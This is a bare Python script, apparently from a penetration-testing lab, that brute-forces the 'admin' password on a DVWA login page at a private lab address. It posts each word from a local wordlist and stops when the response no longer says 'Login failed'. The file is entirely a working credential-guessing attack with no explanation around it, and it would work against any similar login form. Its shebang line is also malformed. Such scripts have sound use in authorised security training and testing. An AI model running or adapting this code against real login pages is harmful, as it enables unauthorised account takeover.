#usr/bin/env python3

import requests

target_url = "http://10.0.2.7/dvwa/login.php"
data_dict = {"username" : "admin", "password" : "", "Login" : "submit"}
response = requests.post(target_url, data=data_dict)


with open("/root/Downloads/passwords.txt") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of the file ")

